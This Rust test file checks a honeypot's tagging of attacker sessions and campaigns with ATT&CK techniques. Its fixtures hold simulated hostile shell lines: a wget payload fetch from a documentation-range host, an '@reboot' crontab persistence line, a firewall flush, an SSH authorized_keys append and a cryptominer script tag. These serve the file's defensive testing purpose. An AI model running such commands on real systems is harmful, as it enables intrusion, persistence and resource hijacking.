//! ATT&CK tagging through the campaign indexer against real Postgres: tags on sessions, sources
//! and campaigns, with the event and token each came from; a campaign carrying the union of its
//! runs' tags and nothing from other campaigns; the sensors and lines that must not be tagged.
//!
//! The rules themselves are tested line by line in `review::attack::tests`; the batch-boundary
//! property (incremental indexing equals one pass) includes both tag tables in
//! `campaign_test.rs`. Addresses are RFC 5737; hashes are synthetic.

use std::collections::{BTreeMap, BTreeSet};
use std::net::IpAddr;
use std::path::PathBuf;

use chrono::{DateTime, Duration, TimeZone, Utc};
use core_scoring::{EventInput, Protocol, SignalType, append_event};
use review::attack;
use review::campaign::{self, BatchOutcome};
use sensor_framework::Uuid;
use serde_json::{Value, json};
use sha2::{Digest, Sha256};
use sqlx::{PgPool, Row};

async fn migrate(pool: &PgPool) {
    sqlx::migrate!("../core-scoring/migrations")
        .run(pool)
        .await
        .unwrap();
    review::migrator().run(pool).await.unwrap();
}

fn t0() -> DateTime<Utc> {
    Utc.with_ymd_and_hms(2026, 10, 7, 4, 41, 0).unwrap()
}

fn sha_hex(bytes: &[u8]) -> String {
    Sha256::digest(bytes)
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect()
}

async fn append(
    pool: &PgPool,
    ip: &str,
    sensor: &str,
    signal: SignalType,
    at: DateTime<Utc>,
    metadata: Value,
    session: Option<Uuid>,
) -> i64 {
    let event = EventInput::from_signal(
        ip.parse::<IpAddr>().unwrap(),
        None,
        sensor.into(),
        signal,
        Protocol::Tcp,
        true,
        at,
        metadata,
        session,
    );
    append_event(pool, event).await.unwrap();
    sqlx::query_scalar("SELECT max(id) FROM event")
        .fetch_one(pool)
        .await
        .unwrap()
}

/// Appends a command and returns its event id.
async fn command(
    pool: &PgPool,
    ip: &str,
    sensor: &str,
    at: DateTime<Utc>,
    session: Uuid,
    cmd: &str,
) -> i64 {
    append(
        pool,
        ip,
        sensor,
        SignalType::HoneypotCommandExec,
        at,
        json!({ "command": cmd }),
        Some(session),
    )
    .await
}

async fn index_all(pool: &PgPool) {
    loop {
        match campaign::index_batch(pool, campaign::BATCH_EVENTS)
            .await
            .unwrap()
        {
            BatchOutcome::Indexed(0) => return,
            BatchOutcome::Indexed(_) => {}
            BatchOutcome::LockedOut => panic!("nothing else holds the campaign lock in a test"),
        }
    }
}

/// Later traffic on `ssh` moves its clock past every session's idle gap, so open runs are grouped.
async fn end_runs(pool: &PgPool) {
    command(
        pool,
        "192.0.2.99",
        "ssh",
        t0() + Duration::hours(6),
        Uuid::now_v7(),
        "id",
    )
    .await;
    index_all(pool).await;
}

/// `(kind, key)` of the campaign each tag row belongs to -> rule -> (event id, matched).
async fn campaign_tag_rows(
    pool: &PgPool,
) -> BTreeMap<String, BTreeMap<String, (Option<i64>, String)>> {
    let rows = sqlx::query(
        "SELECT c.id::text AS id, t.rule_id, t.event_id, t.matched \
         FROM campaign_attack_tag t JOIN campaign c ON c.id = t.campaign_id",
    )
    .fetch_all(pool)
    .await
    .unwrap();
    let mut out: BTreeMap<String, BTreeMap<String, (Option<i64>, String)>> = BTreeMap::new();
    for r in rows {
        out.entry(r.get("id"))
            .or_default()
            .insert(r.get("rule_id"), (r.get("event_id"), r.get("matched")));
    }
    out
}

async fn campaign_id(pool: &PgPool, kind: &str, key_like: &str) -> i64 {
    sqlx::query_scalar("SELECT id FROM campaign WHERE kind = $1 AND key LIKE $2")
        .bind(kind)
        .bind(key_like)
        .fetch_one(pool)
        .await
        .unwrap()
}

/// The campaign that carries a tag of `rule`; one in these tests.
async fn campaign_with(pool: &PgPool, rule: &str) -> i64 {
    sqlx::query_scalar("SELECT campaign_id FROM campaign_attack_tag WHERE rule_id = $1")
        .bind(rule)
        .fetch_one(pool)
        .await
        .unwrap()
}

/// Four commands every session of the family sends, the fingerprint's key.
const OPENING: [&str; 4] = [
    "uname -a",
    "cat /proc/cpuinfo",
    "ls /tmp",
    "wget http://198.51.100.7/x -O /tmp/x",
];

/// Runs a session of `OPENING` plus `tail`, one command every two seconds from `start`, and
/// returns the session id with the event id of each command.
async fn run(pool: &PgPool, ip: &str, start: DateTime<Utc>, tail: &[&str]) -> (Uuid, Vec<i64>) {
    let session = Uuid::now_v7();
    let mut ids = Vec::new();
    for (i, c) in OPENING.iter().chain(tail).enumerate() {
        ids.push(
            command(
                pool,
                ip,
                "ssh",
                start + Duration::seconds(2 * i as i64),
                session,
                c,
            )
            .await,
        );
    }
    (session, ids)
}

#[sqlx::test(migrations = false)]
async fn a_campaign_carries_the_union_of_its_sessions_tags_and_no_others(pool: PgPool) {
    migrate(&pool).await;
    // Two sessions of one family that differ after the opening, and a different family.
    let (sess_a, a) = run(
        &pool,
        "192.0.2.10",
        t0(),
        &["(crontab -l; echo '@reboot /tmp/x') | crontab -"],
    )
    .await;
    let (sess_b, b) = run(
        &pool,
        "192.0.2.11",
        t0() + Duration::minutes(1),
        &["chmod +x /tmp/x", "rm -f /tmp/x"],
    )
    .await;
    let other = Uuid::now_v7();
    for (i, c) in ["iptables -F", "free -m", "df -h", "w", "id"]
        .iter()
        .enumerate()
    {
        command(
            &pool,
            "192.0.2.12",
            "ssh",
            t0() + Duration::seconds(i as i64),
            other,
            c,
        )
        .await;
    }

    // Before the runs end, nothing is on a campaign: the tags wait on the session.
    index_all(&pool).await;
    assert!(campaign_tag_rows(&pool).await.is_empty());
    let pending: Value = sqlx::query_scalar(
        "SELECT attack_pending FROM campaign_session WHERE session_id = $1::uuid",
    )
    .bind(sess_a.to_string())
    .fetch_one(&pool)
    .await
    .unwrap();
    assert!(
        pending
            .as_array()
            .unwrap()
            .iter()
            .any(|e| e["rule"] == "cron-install"),
        "{pending}"
    );

    end_runs(&pool).await;
    let family = campaign_with(&pool, "cron-install").await;
    let tags = campaign_tag_rows(&pool).await;
    assert_eq!(
        tags.len(),
        2,
        "one command-sequence campaign per family: {tags:?}"
    );
    let first = &tags[&family.to_string()];
    let rules: BTreeSet<&str> = first.keys().map(String::as_str).collect();
    assert_eq!(
        rules,
        BTreeSet::from([
            "cron-install",
            "download-command",
            "file-deletion",
            "file-discovery",
            "permissions",
            "system-info",
        ]),
        "the union of both sessions' tags, and not the other family's firewall flush"
    );
    // Evidence is the lowest event that satisfied each rule, across both sessions.
    assert_eq!(first["system-info"], (Some(a[0]), "uname".into()));
    assert_eq!(first["file-discovery"], (Some(a[2]), "ls".into()));
    assert_eq!(
        first["download-command"],
        (Some(a[3]), "http://198.51.100.7/x".into())
    );
    assert_eq!(first["cron-install"], (Some(a[4]), "crontab".into()));
    assert_eq!(first["permissions"], (Some(b[4]), "chmod +x".into()));
    assert_eq!(first["file-deletion"], (Some(b[5]), "rm /tmp/x".into()));

    // The other family: its own tags only.
    let other_id = tags.keys().find(|k| **k != family.to_string()).unwrap();
    assert!(tags[other_id].contains_key("firewall-disable"));
    assert!(!tags[other_id].contains_key("cron-install"));

    // The sessions keep their own: session A never ran chmod.
    let by_session = attack::session_tags(&pool, &[sess_a.to_string(), sess_b.to_string()])
        .await
        .unwrap();
    assert_eq!(by_session.len(), 2, "both sessions answered by one call");
    let techniques: BTreeSet<&str> = by_session[&sess_a.to_string()]
        .iter()
        .map(|t| t.technique.as_str())
        .collect();
    let b_techniques: BTreeSet<&str> = by_session[&sess_b.to_string()]
        .iter()
        .map(|t| t.technique.as_str())
        .collect();
    assert!(
        b_techniques.contains("T1222.002"),
        "session B ran chmod, session A did not: {b_techniques:?}"
    );
    assert!(!techniques.contains("T1222.002"));
    assert!(
        attack::session_tags(&pool, &[]).await.unwrap().is_empty(),
        "no ids, no query"
    );
    assert_eq!(
        techniques,
        BTreeSet::from(["T1053.003", "T1082", "T1083", "T1105"])
    );
}

#[sqlx::test(migrations = false)]
async fn lines_that_only_name_a_technique_are_tagged_nowhere(pool: PgPool) {
    migrate(&pool).await;
    let session = Uuid::now_v7();
    for (i, c) in [
        "echo crontab",
        "echo '* * * * * x' | cat",
        "cat /etc/crontab",
        "wget http://198.51.100.7/cron/crontab.sh -O /tmp/cron.sh",
        "echo authorized_keys",
        "cat ~/.ssh/authorized_keys",
        "echo rm -rf /",
    ]
    .iter()
    .enumerate()
    {
        command(
            &pool,
            "192.0.2.20",
            "ssh",
            t0() + Duration::seconds(i as i64),
            session,
            c,
        )
        .await;
    }
    index_all(&pool).await;
    let rules: BTreeSet<String> = sqlx::query_scalar("SELECT rule_id FROM attack_tag")
        .fetch_all(&pool)
        .await
        .unwrap()
        .into_iter()
        .collect();
    // The download is a download; every other word is an argument.
    assert_eq!(
        rules,
        BTreeSet::from(["download-command".to_string()]),
        "{rules:?}"
    );
}

#[sqlx::test(migrations = false)]
async fn only_shell_sensors_are_read_as_shell_lines(pool: PgPool) {
    migrate(&pool).await;
    let s = Uuid::now_v7();
    // The same line on a protocol sensor and on the ADB sensor is not a Unix shell line.
    for sensor in ["http", "redis", "adb"] {
        command(
            &pool,
            "192.0.2.21",
            sensor,
            t0(),
            s,
            "wget http://198.51.100.7/x; chmod +x x",
        )
        .await;
        append(
            &pool,
            "192.0.2.21",
            sensor,
            SignalType::HoneypotFileDownload,
            t0(),
            json!({ "url": "http://198.51.100.7/x" }),
            Some(s),
        )
        .await;
    }
    append(
        &pool,
        "192.0.2.21",
        "adb",
        SignalType::HoneypotMalwareUpload,
        t0(),
        json!({ "sample_sha256": sha_hex(b"adb body") }),
        None,
    )
    .await;
    index_all(&pool).await;
    let n: i64 = sqlx::query_scalar("SELECT count(*) FROM attack_tag")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(n, 0);
    let on_campaign: i64 = sqlx::query_scalar("SELECT count(*) FROM campaign_attack_tag")
        .fetch_one(&pool)
        .await
        .unwrap();
    assert_eq!(on_campaign, 0);
}

#[sqlx::test(migrations = false)]
async fn a_signal_without_a_session_is_tagged_on_its_source(pool: PgPool) {
    migrate(&pool).await;
    let first = append(
        &pool,
        "192.0.2.30",
        "ssh",
        SignalType::SshBruteForce,
        t0(),
        json!({}),
        None,
    )
    .await;
    let last = append(
        &pool,
        "192.0.2.30",
        "ssh",
        SignalType::SshBruteForce,
        t0() + Duration::minutes(3),
        json!({}),
        None,
    )
    .await;
    append(
        &pool,
        "192.0.2.31",
        "ssh",
        SignalType::HoneypotLoginAttempt,
        t0(),
        json!({ "username": "root" }),
        None,
    )
    .await;
    index_all(&pool).await;
    let row = sqlx::query(
        "SELECT technique_id, rule_id, session_id::text AS session, event_id, matched, sightings \
         FROM attack_tag WHERE source_ip = '192.0.2.30'::inet",
    )
    .fetch_one(&pool)
    .await
    .unwrap();
    assert_eq!(row.get::<String, _>("technique_id"), "T1110");
    assert_eq!(row.get::<String, _>("rule_id"), "brute-force-signal");
    assert_eq!(row.get::<Option<String>, _>("session"), None);
    assert_eq!(row.get::<i64, _>("event_id"), first);
    assert_ne!(first, last);
    assert_eq!(row.get::<i64, _>("sightings"), 2);
    // A login attempt is not a brute force: the honeypot accepts every credential.
    let other: i64 =
        sqlx::query_scalar("SELECT count(*) FROM attack_tag WHERE source_ip = '192.0.2.31'::inet")
            .fetch_one(&pool)
            .await
            .unwrap();
    assert_eq!(other, 0);
}

#[sqlx::test(migrations = false)]
async fn a_sample_campaign_is_tagged_by_how_the_sample_arrived_and_what_it_carries(pool: PgPool) {
    migrate(&pool).await;
    let spool = tempfile::tempdir().unwrap();
    let uploaded = sha_hex(b"uploaded body");
    let page = "<script src=\"https://coinhive.com/lib/coinhive.min.js\"></script>\n";
    let miner = sha_hex(page.as_bytes());
    std::fs::write(spool.path().join(&miner), page).unwrap();
    let up = append(
        &pool,
        "192.0.2.40",
        "ssh",
        SignalType::HoneypotMalwareUpload,
        t0(),
        json!({ "sample_sha256": &uploaded }),
        None,
    )
    .await;
    append(
        &pool,
        "192.0.2.41",
        "telnet",
        SignalType::HoneypotMalwareUpload,
        t0(),
        json!({ "sample_sha256": &miner }),
        None,
    )
    .await;
    // A fetched sample: the download URL the fetcher captured a body from.
    let url = "http://198.51.100.80/bins/x86";
    let fetched = Sha256::digest(b"fetched loader").to_vec();
    sqlx::query(
        "INSERT INTO fetch_attempt (url_hash, url, host, scheme, status, sha256, last_attempt) \
         VALUES ($1, $2, '198.51.100.80', 'http', 'success', $3, now())",
    )
    .bind(Sha256::digest(url.as_bytes()).to_vec())
    .bind(url)
    .bind(&fetched)
    .execute(&pool)
    .await
    .unwrap();
    let dl = append(
        &pool,
        "192.0.2.42",
        "telnet",
        SignalType::HoneypotFileDownload,
        t0(),
        json!({ "url": url }),
        None,
    )
    .await;
    index_all(&pool).await;
    let dirs: Vec<(&'static str, PathBuf)> = vec![("ssh", spool.path().to_path_buf())];
    assert_eq!(campaign::scan_artifacts(&pool, &dirs).await.unwrap(), 1);

    let tags = campaign_tag_rows(&pool).await;
    let up_id = campaign_id(&pool, "sample", &uploaded).await.to_string();
    assert_eq!(
        tags[&up_id],
        BTreeMap::from([("upload-sample".to_string(), (Some(up), uploaded.clone()))])
    );
    let fetched_key: String = fetched.iter().map(|b| format!("{b:02x}")).collect();
    let fetched_id = campaign_id(&pool, "sample", &fetched_key).await.to_string();
    assert_eq!(
        tags[&fetched_id],
        BTreeMap::from([("download-event".to_string(), (Some(dl), url.to_string()))])
    );
    // The miner page: uploaded, and its text carries the miner script, with the artifact as the
    // evidence rather than an event.
    let miner_id = campaign_id(&pool, "sample", &miner).await;
    let row = sqlx::query(
        "SELECT technique_id, event_id, artifact_sha256, matched FROM campaign_attack_tag \
         WHERE campaign_id = $1 AND rule_id = 'miner-script'",
    )
    .bind(miner_id)
    .fetch_one(&pool)
    .await
    .unwrap();
    assert_eq!(row.get::<String, _>("technique_id"), "T1496.001");
    assert_eq!(row.get::<Option<i64>, _>("event_id"), None);
    assert_eq!(
        row.get::<Option<String>, _>("artifact_sha256"),
        Some(miner.clone())
    );
    assert_eq!(
        row.get::<String, _>("matched"),
        "https://coinhive.com/lib/coinhive.min.js"
    );
    assert!(tags[&miner_id.to_string()].contains_key("upload-sample"));
    // Scanning again changes nothing.
    let before = campaign_tag_rows(&pool).await;
    campaign::scan_artifacts(&pool, &dirs).await.unwrap();
    assert_eq!(campaign_tag_rows(&pool).await, before);
}

#[sqlx::test(migrations = false)]
async fn tags_read_back_grouped_by_technique_with_the_matrix_version(pool: PgPool) {
    migrate(&pool).await;
    let (session, ids) = run(
        &pool,
        "192.0.2.50",
        t0(),
        &[
            "cd /tmp",
            "echo 'ssh-ed25519 AAAA fixture' >> /root/.ssh/authorized_keys",
        ],
    )
    .await;
    end_runs(&pool).await;
    let id = campaign_id(&pool, "command_sequence", "%").await;

    let by_campaign = attack::campaign_tags(&pool, &[id]).await.unwrap();
    let view = &by_campaign[&id];
    let techniques: Vec<&str> = view.iter().map(|t| t.technique.as_str()).collect();
    assert_eq!(
        techniques,
        ["T1082", "T1083", "T1098.004", "T1105"],
        "sorted by technique id"
    );
    assert!(
        view.iter()
            .all(|t| t.matrix_version == attack::MATRIX_VERSION)
    );
    let keys = &view.iter().find(|t| t.technique == "T1098.004").unwrap();
    assert_eq!(keys.name, "Account Manipulation: SSH Authorized Keys");
    assert_eq!(keys.evidence[0].rule, "authorized-keys");
    assert_eq!(keys.evidence[0].event_id, Some(ids[5]));
    assert_eq!(keys.evidence[0].matched, "/root/.ssh/authorized_keys");

    let by_source = attack::source_tags(&pool, &["192.0.2.50".to_string()])
        .await
        .unwrap();
    assert_eq!(by_source["192.0.2.50"], *view);
    let json = serde_json::to_value(&by_source["192.0.2.50"][0]).unwrap();
    assert_eq!(json["technique"], "T1082");
    assert_eq!(json["matrix_version"], "v19.2");
    assert_eq!(json["evidence"][0]["event_id"], ids[0]);
    assert_eq!(
        attack::session_tags(&pool, &[session.to_string()])
            .await
            .unwrap()[&session.to_string()],
        *view
    );
    assert!(attack::campaign_tags(&pool, &[]).await.unwrap().is_empty());
}
